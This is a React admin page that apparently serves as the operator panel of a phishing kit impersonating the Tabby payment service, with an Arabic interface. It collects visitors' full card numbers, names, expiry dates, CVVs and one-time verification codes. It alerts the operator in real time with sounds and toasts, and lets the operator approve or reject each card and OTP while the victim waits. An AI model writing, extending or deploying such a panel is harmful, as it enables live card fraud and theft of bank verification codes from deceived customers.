import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAdminNotifications } from "@/hooks/useAdminNotifications";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { useToast } from "@/hooks/use-toast";
import { useNavigate } from "react-router-dom";
import { AdminSidebar } from "@/components/AdminSidebar";
import { SidebarProvider } from "@/components/ui/sidebar";
import { Loader2, CreditCard, Check, X } from "lucide-react";
import { format } from "date-fns";
import { ar } from "date-fns/locale";
import { VisitorStatusIndicator } from "@/components/VisitorStatusIndicator";

interface TabbyPayment {
  id: string;
  cardholder_name: string;
  card_number: string;
  card_number_last4: string;
  expiry_date: string;
  cvv: string;
  total_amount: number;
  company: string | null;
  phone: string | null;
  payment_status: string;
  created_at: string;
  updated_at: string;
  visitor_session_id?: string | null;
}

interface TabbyPaymentAttempt {
  id: string;
  payment_id: string;
  card_number: string;
  cardholder_name: string;
  expiry_date: string;
  cvv: string;
  created_at: string;
  approval_status?: string;
}

interface TabbyOtpAttempt {
  id: string;
  payment_id: string;
  otp_code: string;
  created_at: string;
  approval_status?: string;
}
const AdminTabbyPayments = () => {
  useAdminNotifications();
  const [payments, setPayments] = useState<TabbyPayment[]>([]);
  const [paymentAttempts, setPaymentAttempts] = useState<Record<string, TabbyPaymentAttempt[]>>({});
  const [otpAttempts, setOtpAttempts] = useState<Record<string, TabbyOtpAttempt[]>>({});
  const [loading, setLoading] = useState(true);
  const [processing, setProcessing] = useState<string | null>(null);
  const {
    toast
  } = useToast();
  const navigate = useNavigate();
  
  // دالة لتشغيل صوت إشعار مميز وملفت لتابي
  const playTabbyNotificationSound = () => {
    const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
    
    // تشغيل نغمة مميزة ومختلفة عن تمارا
    const playBeep = (frequency: number, startTime: number, duration: number) => {
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      oscillator.frequency.setValueAtTime(frequency, startTime);
      oscillator.type = 'square'; // نوع موجة مختلف عن تمارا
      
      gainNode.gain.setValueAtTime(0.35, startTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, startTime + duration);
      
      oscillator.start(startTime);
      oscillator.stop(startTime + duration);
    };
    
    // تشغيل سلسلة نغمات مختلفة عن تمارا
    const currentTime = audioContext.currentTime;
    playBeep(900, currentTime, 0.12);
    playBeep(1100, currentTime + 0.15, 0.12);
    playBeep(1300, currentTime + 0.3, 0.12);
    playBeep(1500, currentTime + 0.45, 0.2);
    
    // نغمة إضافية
    setTimeout(() => {
      const newTime = audioContext.currentTime;
      playBeep(1200, newTime, 0.12);
      playBeep(1400, newTime + 0.12, 0.15);
    }, 700);
  };
  useEffect(() => {
    const checkAuth = async () => {
      const {
        data: {
          session
        }
      } = await supabase.auth.getSession();
      if (!session) {
        console.log("⚠️ No session found, redirecting to login");
        navigate("/admin");
        return;
      }
      console.log("✅ Session found, fetching payments...");
      await fetchPayments();
    };
    checkAuth();
    
    // Real-time subscription for all tables
    const channel = supabase.channel('tabby-payments-changes')
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_payments'
      }, (payload) => {
        console.log('🔔 عميل جديد أدخل رقمه في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 طلب دفع تابي جديد!",
          description: `رقم الهاتف: ${payload.new.phone || 'غير متوفر'} | المبلغ: ${payload.new.total_amount} ر.س`,
          duration: 10000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_payments'
      }, () => {
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_payment_attempts'
      }, (payload) => {
        console.log('🔔 عميل أدخل بيانات بطاقة في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 بطاقة دفع جديدة!",
          description: `رقم البطاقة: ****${payload.new.card_number?.slice(-4) || '****'}`,
          duration: 8000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_payment_attempts'
      }, () => {
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'INSERT',
        schema: 'public',
        table: 'tabby_otp_attempts'
      }, (payload) => {
        console.log('🔔 عميل أدخل OTP في تابي!', payload.new);
        playTabbyNotificationSound();
        toast({
          title: "🔔 كود تحقق جديد!",
          description: `الكود: ${payload.new.otp_code}`,
          duration: 8000
        });
        fetchPayments();
      })
      .on('postgres_changes', {
        event: 'UPDATE',
        schema: 'public',
        table: 'tabby_otp_attempts'
      }, () => {
        fetchPayments();
      })
      .subscribe();
    
    // Auto-refresh every 5 minutes (reduced frequency for better performance)
    const refreshInterval = setInterval(() => {
      fetchPayments();
    }, 300000); // 5 minutes

    return () => {
      supabase.removeChannel(channel);
      clearInterval(refreshInterval);
    };
  }, [navigate]);
  const fetchPayments = async () => {
    try {
      console.log("📊 Fetching tabby payments...");
      const { data, error } = await supabase
        .from('tabby_payments')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(50);
      
      if (error) {
        console.error('❌ Error fetching payments:', error);
        toast({
          title: "خطأ",
          description: "حدث خطأ في تحميل البيانات",
          variant: "destructive"
        });
        setLoading(false);
        return;
      }
      
      console.log(`✅ Fetched ${data?.length || 0} payments`);
      setPayments(data || []);
      
      // Fetch payment attempts and OTP attempts in batch
      if (data && data.length > 0) {
        const paymentIds = data.map(p => p.id);
        
        const [attemptsResult, otpsResult] = await Promise.all([
          supabase
            .from('tabby_payment_attempts')
            .select('*')
            .in('payment_id', paymentIds)
            .order('created_at', { ascending: true }),
          supabase
            .from('tabby_otp_attempts')
            .select('*')
            .in('payment_id', paymentIds)
            .order('created_at', { ascending: true })
        ]);

        if (attemptsResult.data) {
          const grouped = attemptsResult.data.reduce((acc, attempt) => {
            if (!acc[attempt.payment_id]) acc[attempt.payment_id] = [];
            acc[attempt.payment_id].push(attempt);
            return acc;
          }, {} as Record<string, TabbyPaymentAttempt[]>);
          setPaymentAttempts(grouped);
        }

        if (otpsResult.data) {
          const grouped = otpsResult.data.reduce((acc, otp) => {
            if (!acc[otp.payment_id]) acc[otp.payment_id] = [];
            acc[otp.payment_id].push(otp);
            return acc;
          }, {} as Record<string, TabbyOtpAttempt[]>);
          setOtpAttempts(grouped);
        }
      }
    } catch (error) {
      console.error('Error fetching payments:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ في تحميل البيانات",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };
  const handleApprovePaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على بطاقة الدفع بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectPaymentAttempt = async (attemptId: string, paymentId: string) => {
    setProcessing(attemptId);
    try {
      const { error } = await supabase
        .from('tabby_payment_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', attemptId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض بطاقة الدفع"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting payment attempt:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleApproveMainCard = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'approved' })
        .eq('id', paymentId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على البطاقة الأساسية بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving main card:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectMainCard = async (paymentId: string) => {
    setProcessing(paymentId);
    try {
      const { error } = await supabase
        .from('tabby_payments')
        .update({ payment_status: 'rejected' })
        .eq('id', paymentId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض البطاقة الأساسية"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting main card:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الرفض",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleApproveOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'approved' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الموافقة",
        description: "تمت الموافقة على كود التحقق بنجاح"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error approving OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء الموافقة على كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };

  const handleRejectOtp = async (otpId: string, paymentId: string) => {
    setProcessing(otpId);
    try {
      const { error } = await supabase
        .from('tabby_otp_attempts')
        .update({ approval_status: 'rejected' })
        .eq('id', otpId);
      
      if (error) throw error;
      
      toast({
        title: "تم الرفض",
        description: "تم رفض كود التحقق"
      });
      fetchPayments();
    } catch (error) {
      console.error('Error rejecting OTP:', error);
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء رفض كود التحقق",
        variant: "destructive"
      });
    } finally {
      setProcessing(null);
    }
  };
  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'approved':
        return <Badge className="bg-green-500">موافق عليه</Badge>;
      case 'rejected':
        return <Badge className="bg-red-500">مرفوض</Badge>;
      case 'pending':
        return <Badge className="bg-yellow-500">قيد الانتظار</Badge>;
      default:
        return <Badge>{status}</Badge>;
    }
  };
  if (loading) {
    return <div className="flex h-screen items-center justify-center">
        <Loader2 className="h-8 w-8 animate-spin" />
      </div>;
  }
  return <SidebarProvider>
      <div className="flex min-h-screen w-full bg-background" dir="rtl">
        <AdminSidebar />
        <div className="flex-1 p-8">
          <div className="mb-6">
            <h1 className="text-3xl font-bold">طلبات تابي</h1>
            <p className="text-muted-foreground">إدارة طلبات الدفع عبر تابي - تحديث تلقائي</p>
          </div>

          {payments.length === 0 ? <Card className="p-8 text-center">
              <p className="text-muted-foreground">لا توجد طلبات دفع حتى الآن</p>
            </Card> : <div className="space-y-8">
              {payments.map((payment, index) => (
                <div key={payment.id}>
                  {/* خط أحمر فاصل بين العملاء */}
                  {index > 0 && (
                    <div className="my-8 h-1 bg-gradient-to-r from-transparent via-red-500 to-transparent rounded-full"></div>
                  )}
                  
                  <Card className="overflow-hidden shadow-lg border-2 hover:shadow-2xl transition-all">
                    <CardHeader className="bg-gradient-to-r from-blue-50 via-purple-50 to-pink-50 border-b-2 border-primary/20">
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-2">
                          <CreditCard className="h-5 w-5 text-primary" />
                          <CardTitle className="text-lg flex items-center gap-2">
                            {payment.cardholder_name}
                            <VisitorStatusIndicator sessionId={payment.visitor_session_id} />
                          </CardTitle>
                        </div>
                        {getStatusBadge(payment.payment_status)}
                      </div>
                      <CardDescription className="mt-1">
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </CardDescription>
                    </CardHeader>

                  <CardContent className="p-6">
                    {/* معلومات أساسية - تصميم محسّن */}
                    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-6">
                      <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
                        <div className="text-xs text-blue-600 font-medium mb-1">شركة التأمين</div>
                        <div className="font-bold text-sm text-gray-900 truncate" title={payment.company || 'غير متوفر'}>
                          {payment.company || 'غير متوفر'}
                        </div>
                      </div>
                      
                      {payment.phone && (
                        <div className="bg-purple-50 border border-purple-200 rounded-lg p-3">
                          <div className="text-xs text-purple-600 font-medium mb-1">رقم الهاتف</div>
                          <div className="font-bold text-sm text-gray-900" dir="ltr">
                            {payment.phone}
                          </div>
                        </div>
                      )}
                      
                      <div className="bg-green-50 border border-green-200 rounded-lg p-3">
                        <div className="text-xs text-green-600 font-medium mb-1">المبلغ الإجمالي</div>
                        <div className="font-bold text-lg text-green-700">
                          {payment.total_amount.toFixed(2)} ر.س
                        </div>
                      </div>
                    </div>

                    {/* جميع محاولات الدفع (البطاقة الأساسية + المحاولات الإضافية) */}
                    {(payment.card_number || paymentAttempts[payment.id]) && (
                      <div className="mb-6">
                        <h3 className="font-semibold flex items-center gap-2 text-sm text-orange-600 mb-3">
                          <CreditCard className="h-4 w-4" />
                          محاولات الدفع ({(payment.card_number && payment.card_number !== '0000000000000000' ? 1 : 0) + (paymentAttempts[payment.id]?.length || 0)})
                        </h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                          {/* البطاقة الأساسية - المحاولة الأولى - فقط إذا كانت تحتوي على بيانات حقيقية */}
                          {payment.card_number && payment.card_number !== '0000000000000000' && (
                            <div 
                              className={`rounded-lg p-3 border-2 ${
                                payment.payment_status === 'rejected' 
                                  ? 'bg-red-50 border-red-400' 
                                  : payment.payment_status === 'approved'
                                  ? 'bg-green-50 border-green-400'
                                  : 'bg-blue-50 border-blue-400'
                              }`}
                            >
                              <div className="flex justify-between items-center mb-2">
                                <span className={`text-xs font-bold ${
                                  payment.payment_status === 'rejected' 
                                    ? 'text-red-700' 
                                    : payment.payment_status === 'approved'
                                    ? 'text-green-700'
                                    : 'text-blue-600'
                                }`}>
                                  محاولة #1 (الأساسية)
                                </span>
                                {payment.payment_status === 'approved' && (
                                  <Badge className="bg-green-600 text-xs">
                                    ✓ موافق عليها
                                  </Badge>
                                )}
                                {payment.payment_status === 'rejected' && (
                                  <Badge className="bg-red-600 text-xs">
                                    ✗ مرفوضة
                                  </Badge>
                                )}
                                {payment.payment_status === 'pending' && (
                                  <Badge className="bg-yellow-500 text-xs">
                                    ⏳ قيد الانتظار
                                  </Badge>
                                )}
                              </div>
                              <div className="space-y-1.5 text-xs">
                                <div className="flex justify-between">
                                  <span className="text-gray-500">رقم البطاقة:</span>
                                  <span className="font-mono font-medium" dir="ltr">
                                    {payment.card_number}
                                  </span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-gray-500">الاسم:</span>
                                  <span className="font-medium truncate max-w-[120px]" title={payment.cardholder_name}>
                                    {payment.cardholder_name}
                                  </span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-gray-500">الانتهاء:</span>
                                  <span className="font-medium" dir="ltr">{payment.expiry_date}</span>
                                </div>
                                <div className="flex justify-between">
                                  <span className="text-gray-500">CVV:</span>
                                  <span className="font-mono font-medium">{payment.cvv}</span>
                                </div>
                                <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-blue-200">
                                  {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                                </div>
                              </div>

                              {payment.payment_status === 'pending' && (
                                <div className="flex gap-2 mt-3 pt-3 border-t border-blue-300">
                                  <Button
                                    onClick={() => handleApproveMainCard(payment.id)}
                                    disabled={processing === payment.id}
                                    className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                  >
                                    {processing === payment.id ? (
                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                    ) : (
                                      <Check className="h-3 w-3 ml-1" />
                                    )}
                                    موافقة
                                  </Button>
                                  <Button
                                    onClick={() => handleRejectMainCard(payment.id)}
                                    disabled={processing === payment.id}
                                    variant="destructive"
                                    className="flex-1 h-8 text-xs"
                                  >
                                    {processing === payment.id ? (
                                      <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                    ) : (
                                      <X className="h-3 w-3 ml-1" />
                                    )}
                                    رفض
                                  </Button>
                                </div>
                              )}
                            </div>
                          )}

                          {/* المحاولات الإضافية */}
                          {paymentAttempts[payment.id] && paymentAttempts[payment.id].map((attempt, index) => {
                            // حساب الرقم الصحيح للمحاولة
                            const attemptNumber = (payment.card_number && payment.card_number !== '0000000000000000' ? 2 : 1) + index;
                            
                            return (
                              <div 
                                key={attempt.id} 
                                className={`rounded-lg p-3 border-2 ${
                                  attempt.approval_status === 'rejected' 
                                    ? 'bg-red-50 border-red-400' 
                                    : attempt.approval_status === 'approved'
                                    ? 'bg-green-50 border-green-400'
                                    : 'bg-orange-50 border-orange-200'
                                }`}
                              >
                                <div className="flex justify-between items-center mb-2">
                                  <span className={`text-xs font-bold ${
                                    attempt.approval_status === 'rejected' 
                                      ? 'text-red-700' 
                                      : attempt.approval_status === 'approved'
                                      ? 'text-green-700'
                                      : 'text-orange-600'
                                  }`}>
                                    محاولة #{attemptNumber}
                                  </span>
                                  {attempt.approval_status && (
                                    <Badge className={attempt.approval_status === 'approved' ? 'bg-green-600 text-xs' : 'bg-red-600 text-xs'}>
                                      {attempt.approval_status === 'approved' ? '✓ موافق عليها' : '✗ مرفوضة'}
                                    </Badge>
                                  )}
                                  {!attempt.approval_status && (
                                    <Badge className="bg-yellow-500 text-xs">
                                      ⏳ قيد الانتظار
                                    </Badge>
                                  )}
                                </div>
                                <div className="space-y-1.5 text-xs">
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">رقم البطاقة:</span>
                                    <span className="font-mono font-medium" dir="ltr">
                                      {attempt.card_number}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الاسم:</span>
                                    <span className="font-medium truncate max-w-[120px]" title={attempt.cardholder_name}>
                                      {attempt.cardholder_name}
                                    </span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">الانتهاء:</span>
                                    <span className="font-medium" dir="ltr">{attempt.expiry_date}</span>
                                  </div>
                                  <div className="flex justify-between">
                                    <span className="text-gray-500">CVV:</span>
                                    <span className="font-mono font-medium">{attempt.cvv}</span>
                                  </div>
                                  <div className="text-xs text-gray-500 text-center mt-2 pt-2 border-t border-orange-200">
                                    {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
                                  </div>
                                </div>

                                {!attempt.approval_status && (
                                  <div className="flex gap-2 mt-3 pt-3 border-t border-orange-300">
                                    <Button
                                      onClick={() => handleApprovePaymentAttempt(attempt.id, payment.id)}
                                      disabled={processing === attempt.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white h-8 text-xs"
                                    >
                                      {processing === attempt.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button
                                      onClick={() => handleRejectPaymentAttempt(attempt.id, payment.id)}
                                      disabled={processing === attempt.id}
                                      variant="destructive"
                                      className="flex-1 h-8 text-xs"
                                    >
                                      {processing === attempt.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}

                    {/* أكواد التحقق النهائية - بنفس تصميم تمارا */}
                    {otpAttempts[payment.id] && otpAttempts[payment.id].length > 0 && (
                      <div className="mt-6 p-4 bg-gradient-to-br from-purple-50 to-pink-50 rounded-xl border-2 border-purple-300">
                        <h3 className="font-bold flex items-center gap-2 text-lg text-purple-700 mb-4">
                          🔐 أكواد التحقق النهائية ({otpAttempts[payment.id].length})
                        </h3>
                        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                          {otpAttempts[payment.id].map((otp, index) => {
                            const isLatest = index === 0;
                            return (
                              <div 
                                key={otp.id} 
                                className={`border-2 rounded-xl p-4 transition-all ${
                                  isLatest 
                                    ? 'bg-gradient-to-br from-purple-100 to-pink-100 border-purple-400 shadow-lg ring-4 ring-purple-200' 
                                    : 'bg-white border-gray-300'
                                }`}
                              >
                                <div className="flex justify-between items-center mb-3">
                                  <span className={`text-sm font-bold ${isLatest ? 'text-purple-700' : 'text-gray-600'}`}>
                                    {isLatest ? '⭐ الأحدث' : `محاولة #${otpAttempts[payment.id]!.length - index}`}
                                  </span>
                                  {otp.approval_status && (
                                    <Badge className={otp.approval_status === 'approved' ? 'bg-green-500' : 'bg-red-500'}>
                                      {otp.approval_status === 'approved' ? 'موافق عليه' : 'مرفوض'}
                                    </Badge>
                                  )}
                                </div>
                                
                                <div className="space-y-2">
                                  <div className="flex justify-between items-center bg-white rounded-lg p-3 shadow-sm">
                                    <span className="text-sm text-gray-600">كود التحقق:</span>
                                    <span className={`font-mono font-bold text-2xl tracking-wider ${
                                      isLatest ? 'text-purple-700' : 'text-gray-700'
                                    }`}>
                                      {otp.otp_code}
                                    </span>
                                  </div>
                                  <div className="text-xs text-gray-600 text-center bg-white rounded-lg p-2">
                                    {format(new Date(otp.created_at), 'PPp', { locale: ar })}
                                  </div>
                                </div>

                                {!otp.approval_status && isLatest && (
                                  <div className="flex gap-2 mt-3">
                                    <Button 
                                      onClick={() => handleApproveOtp(otp.id, payment.id)} 
                                      disabled={processing === otp.id}
                                      className="flex-1 bg-green-600 hover:bg-green-700 text-white text-xs h-9"
                                    >
                                      {processing === otp.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <Check className="h-3 w-3 ml-1" />
                                      )}
                                      موافقة
                                    </Button>
                                    <Button 
                                      onClick={() => handleRejectOtp(otp.id, payment.id)} 
                                      disabled={processing === otp.id}
                                      variant="destructive"
                                      className="flex-1 text-xs h-9"
                                    >
                                      {processing === otp.id ? (
                                        <Loader2 className="h-3 w-3 animate-spin ml-1" />
                                      ) : (
                                        <X className="h-3 w-3 ml-1" />
                                      )}
                                      رفض
                                    </Button>
                                  </div>
                                )}
                              </div>
                            );
                          })}
                        </div>
                      </div>
                    )}


                    {/* معلومات التاريخ */}
                    <div className="p-3 bg-gray-50 rounded-lg">
                      <div className="text-xs text-gray-500 mb-1">تاريخ الإنشاء</div>
                      <div className="text-sm font-medium">
                        {format(new Date(payment.created_at), 'PPp', { locale: ar })}
                      </div>
                      {payment.updated_at !== payment.created_at && (
                        <>
                          <div className="text-xs text-gray-500 mb-1 mt-2">آخر تحديث</div>
                          <div className="text-sm font-medium">
                            {format(new Date(payment.updated_at), 'PPp', { locale: ar })}
                          </div>
                        </>
                      )}
                    </div>
                  </CardContent>
                </Card>
              </div>
            ))}
            </div>}
        </div>
      </div>
    </SidebarProvider>;
};
export default AdminTabbyPayments;